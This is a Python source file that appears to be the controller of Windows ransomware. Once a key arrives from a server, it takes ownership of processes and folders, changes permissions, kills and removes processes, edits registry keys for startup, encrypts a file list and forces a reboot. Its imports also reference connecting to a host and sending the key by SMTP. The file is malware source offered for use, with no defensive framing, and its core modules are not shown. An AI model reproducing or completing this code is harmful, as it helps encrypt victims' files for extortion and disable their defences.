#!/usr/bin/python
#coding:utf-8
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import delproc, regedit
from modules.network import host_connect, sendkey_smtp
import os, time

# INIT VARIABLE TO CALL THE FUNCTION INTO THE CLASS
gt = takeown.GetOwn()
gr = icacls.GetPermission()
dr = delproc.Remove()
dk = delproc.Kill()
rkey = regedit.ManageKey()

# FUNCTION CALLED AFTER OBTAINED THE KEY FROM THE SERVER
def getcrypt():
    gt.proc()
    gr.proc()
    dk.smart()
    dr.stsk()
    rkey.setkey()
    rkey.delkey()
    rkey.setInit()
    gt.dir()
    gr.dir()
    crypt.filelist()
    dk.exp()
    time.sleep(1)
    dr.exp()
    # REBOOT WINDOWS
    os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
